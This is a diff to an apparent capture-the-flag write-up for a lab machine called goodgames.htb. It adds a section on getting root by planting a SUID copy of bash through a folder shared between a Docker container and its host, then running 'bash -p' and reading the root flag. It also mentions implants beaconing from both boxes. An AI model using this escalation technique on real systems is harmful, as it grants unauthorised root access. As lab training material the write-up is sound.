@@ -107,8 +107,8 @@ Table: user
 ```
 
 - Host: ssh://172.17.0.1
-```
 
+```
 +----------+--------------------+
 | name     | password           |
 +----------+--------------------+
@@ -1986,3 +1986,42 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 This appears to land you at the initial landing page of googdame.htb.
+
+# The Downfall
+Admittedly, I missed this last one and had to 'phone a friend'. It kills me as I should have thought about it, knowing it was already in both places.
+
+_Short Answer:_ Abuse the fact that you have access to a folder on the host, as root in docker via the docker (`SUID; bash -p`)
+
+The good news, is that I beaconed both the boxes for easier access back/forth. After I upgraded the shells to interactive sessions, the rest was just a quick switch between the two implants.
+
+On the host (goodgames.htb) I copied the `/bin/bash` file to `/home/augustus`. After switch back to inside the docker and change directories to `/home/augustus`. We need to take ownership of the file and set the SUID.
+
+```
+chown root:root bash
+chmod 4755 bash
+```
+
+Once the settings were verified
+
+```
+augustus@GoodGames:~$ ls -la ./bash 
+-rwsr-xr-x 1 root root 1234376 Jan 10 04:27 ./bash
+```
+
+back to the host as Augustus to spawn a new shell, leveraging the previously set UID:
+
+```
+augustus@GoodGames:~$ ls -la ./bash 
+-rwsr-xr-x 1 root root 1234376 Jan 10 04:27 ./bash
+augustus@GoodGames:~$ ./bash -p     
+bash-5.1# whoami
+root
+```
+
+Cool...now gimme that flag.txt!
+
+```
+bash-5.1# cat /root/root.txt 
+09e759f5c3b03b941180f346483bcbb2
+bash-5.1# 
+```
